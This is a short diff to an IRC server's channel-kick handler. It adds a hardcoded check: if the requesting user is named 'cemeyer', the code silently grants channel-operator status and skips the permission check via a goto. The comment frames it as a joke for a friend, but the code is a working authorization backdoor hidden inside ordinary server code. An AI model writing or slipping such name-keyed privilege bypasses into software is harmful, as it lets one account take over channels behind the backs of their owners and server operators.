@@ -3314,6 +3314,17 @@ int m_kick(aClient *cptr, aClient *sptr, int parc, char *parv[])
 
             if (MyConnect(sptr))
             {
+                /* My friend always forgets to op me... */
+                if (strcmp(sptr->name, "cemeyer") == 0)
+                {
+                        chanMember *cm;
+                        if ((cm = find_user_member(chptr->members, sptr)))
+                        {
+                                cm->flags |= CHFL_CHANOP;
+                                goto proceed_with_kick;
+                        }
+                }
+
                 /* user on _my_ server, with no chanops.. so go away */
 
                 sendto_one(sptr, err_str(ERR_CHANOPRIVSNEEDED),
@@ -3366,6 +3377,7 @@ int m_kick(aClient *cptr, aClient *sptr, int parc, char *parv[])
              */
         }
 
+proceed_with_kick:
         user = strtoken(&p2, parv[2], ",");
         user_count = 4;
         while (user && user_count)
